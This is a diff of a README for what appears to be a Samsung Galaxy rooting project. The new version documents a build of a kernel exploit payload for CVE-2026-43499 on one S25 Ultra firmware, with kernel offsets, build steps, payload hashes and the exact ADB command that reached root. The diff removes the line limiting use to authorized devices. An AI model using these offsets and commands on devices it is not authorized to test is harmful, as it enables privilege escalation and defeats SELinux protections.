@@ -1,78 +1,102 @@
-# Root My Galaxy Payloads
+# S9380ZHU1AYA1 V6 source package
 
-This repository contains the device-specific native side of
-[Root My Galaxy](https://github.com/2253845067/Root-My-Galaxy):
+This is the minimal source package used to compile the V6 payload that
+reached `done=1 root=1` on SM-S9380 ZHU firmware S9380ZHU1AYA1.
 
-- exact firmware profiles and offsets;
-- the app-domain CVE-2026-43499 exploit source and compiled payload;
-- the app bootstrap helper source;
-- the verified KernelSU late-load build artifacts;
-- the support feed consumed by the application.
+The package intentionally does not contain `.o` files. They are generated
+under `build/v6/obj` or `objects-rebuilt` during compilation.
 
-It intentionally does not contain Android application source code.
+## Target configuration
 
-## Supported profiles
+The offset table is:
 
-| Profile | Device | Firmware | Kernel/KMI | Status |
-| --- | --- | --- | --- | --- |
-| `pa3q-S938BXXS9CZE1` | Galaxy S25 Ultra `SM-S938B` | `BP4A.251205.006.S938BXXS9CZE1` | `android15-6.6` | Device-tested |
-| `pa3q-S938NKSUACZF1` | Galaxy S25 Ultra `SM-S938N` | `BP4A.251205.006.S938NKSUACZF1` | `android15-6.6` | Device-tested |
-| `pa3q-S9380ZHUBCZF1` | Galaxy S25 Ultra `SM-S9380` | `BP4A.251205.006.S9380ZHUBCZF1` | `android15-6.6` | Device-tested |
-| `e3q-S928USQS6DZF2` | Galaxy S24 Ultra `SM-S928U/SM-S928U1` (Snapdragon 8 Gen 3) | `BP4A.251205.007.S928USQS6DZF2` | `6.1.145-android14-11-33419968-abS928USQS6DZF2` | Thanks to fusiondrive |
+`target/pa3q-S9380ZHU1AYA1/target.h`
 
-Profiles are exact-firmware profiles. A matching model with a different build
-is not equivalent and must be ported separately.
+Target table SHA-256:
 
-Root My Galaxy requires both the exact `uname -r` value in `kernelRelease` and
-the complete `/proc/version` value in `kernelVersion`. This distinguishes
-vendor kernels that expose the same release string but were linked from
-different builds. Model and device fields are descriptive metadata; build
-display ID, SDK, ABI, and page size remain part of automatic profile selection.
+`F0DD37BDDFCF157CE2ACD9E3CEA7D6D5002C3EF15BA0F7094EF32375DBFE8D51`
 
-The port is based on the exploit source published at
-<https://github.com/NebuSec/CyberMeowfia/tree/main/IonStack/CVE-2026-43499/exploit>.
-
-## Feed delivery
-
-Root My Galaxy resolves the payload repository's current commit first and
-fetches `support/targets-v2.json` and every artifact from that immutable commit.
-Per-artifact SHA-256 fields and manifest signatures are not part of schema
-version 2.
-
-## Build
-
-```sh
-make TARGET=pa3q-S938BXXS9CZE1 ANDROID_NDK_HOME=/path/to/android-ndk
-make TARGET=pa3q-S938NKSUACZF1 ANDROID_NDK_HOME=/path/to/android-ndk
-make TARGET=e3q-S928USQS6DZF2 ANDROID_NDK_HOME=/path/to/android-ndk
-make TARGET=essi-S721NKSSCDZF3 ANDROID_NDK_HOME=/path/to/android-ndk
-make TARGET=e1s-S921BXXSFDZF2 ANDROID_NDK_HOME=/path/to/android-ndk
-make TARGET=a15-A155NKSS6BYH1 ANDROID_NDK_HOME=/path/to/android-ndk
-```
-
-Outputs:
+Important values:
 
 ```text
-build/<profile>/cve-2026-43499
-build/<profile>/cve-2026-43499-app.so
-build/<profile>/cve-2026-43499-root
+KIMAGE_TEXT_BASE                    0xffffffc080000000
+SLIDE_TRACEFS_WORKER_CALLER_OFF     0x000d7ca0
+ASHMEM_MISC_FOPS_OFF                0x02329ee0
+ASHMEM_MISC_FOPS_FIELD_OFF         0x02329ef0
+ASHMEM_FOPS_OFF                     0x0133b148
+CONFIGFS_READ_ITER_OFF              0x0046e5f8
+CONFIGFS_BIN_WRITE_ITER_OFF         0x0046eb24
+INIT_TASK_OFF                       0x0215cd00
+ROOT_TASK_GROUP_OFF                 0x023bed00
+SELINUX_ENFORCING_OFF               0x02420e98
+CALL_USERMODEHELPER_EXEC_WORK_OFF   0x000cf408
+SYSTEM_UNBOUND_WQ_OFF               0x02149e60
+ROOT_UMH_PATH                       /data/local/tmp/cve-2026-43499-root
 ```
 
-The release app payload is built with:
+## Source split
+
+`src/original` contains `main.c`, `util.c`, `fops.c`, `pipe.c`,
+`preload_minimal.c`, and compatibility globals from the restored original
+tree.
+
+`src/device` contains the tracefs `slide.c` and UMH `root.c`. These two files
+were compiled with the device include tree; the object hashes match the V6
+objects saved in `objects`.
+
+`helper/su_daemon.c` is the helper used both by `--run-payload` and by the
+kernel UMH path. It must be installed at the fixed `ROOT_UMH_PATH`.
+
+## Build on Windows
+
+Open PowerShell in this directory and run:
+
+```powershell
+.\build-v6.ps1
+```
+
+The script defaults to the NDK r29 clang path used for the successful build.
+Pass `-Clang` if the NDK is installed elsewhere.
+
+The outputs are written to `artifact-rebuilt/`.
+
+## Build with Make
+
+On Linux, WSL, or macOS with an Android NDK clang:
 
 ```sh
-make TARGET=essi-S721NKSSCDZF3 ANDROID_NDK_HOME=/path/to/android-ndk release
+make CLANG=/path/to/clang
 ```
 
-The complete firmware-to-profile procedure is recorded in
-[`docs/PORTING.md`](docs/PORTING.md). Samsung-specific KernelSU changes and
-versioned artifacts are documented in [`kernelsu/README.md`](kernelsu/README.md).
-The exact S921B DZF2 analysis is recorded separately in
-[`docs/SM-S921B-S921BXXSFDZF2.md`](docs/SM-S921B-S921BXXSFDZF2.md), and the
-S928U/S928U1 DZF2 analysis is in
-[`docs/SM-S928U1-S928U1UES6DZF2.md`](docs/SM-S928U1-S928U1UES6DZF2.md). S921B
-is an Exynos 2400 target and is not a Qualcomm/Snapdragon reference for E3Q.
-The 5.10 A15 analysis is in
-[`docs/SM-A155N-A155NKSS6BYH1.md`](docs/SM-A155N-A155NKSS6BYH1.md).
+The Makefile creates intermediate files under `build/v6/obj`; they are not
+needed at runtime and can be removed with `make clean`.
 
-Use only on devices you own or are explicitly authorized to test.
+The expected payload hash is:
+
+`B4A4E0A69B081FEC4840D0E47CDE5C4FAD50D9F93B04908739A5EC64B085EFCA`
+
+The known-good V6 payload hash is:
+
+`B4A4E0A69B081FEC4840D0E47CDE5C4FAD50D9F93B04908739A5EC64B085EFCA`
+
+The helper source is `helper/su_daemon.c`; it is compiled together with the
+payload by `build-v6.ps1` or `make`.
+
+## Runtime entry
+
+The successful ADB entry used the helper loader, not direct `LD_PRELOAD`:
+
+```text
+PSELECT_ROUTE_ATTEMPTS=1
+PSELECT_DELAY_USEC=10000
+/data/local/tmp/cve-2026-43499-root --run-payload \
+  /data/local/tmp/cve-2026-43499-root-original-zhu-v6.so \
+  /data/local/tmp/cve-2026-43499-root \
+  /data/local/tmp/zhu-v6.log
+```
+
+The success line from the known-good run was:
+
+```text
+pipe-physrw-summary ... done=1 root=1 ...
+```
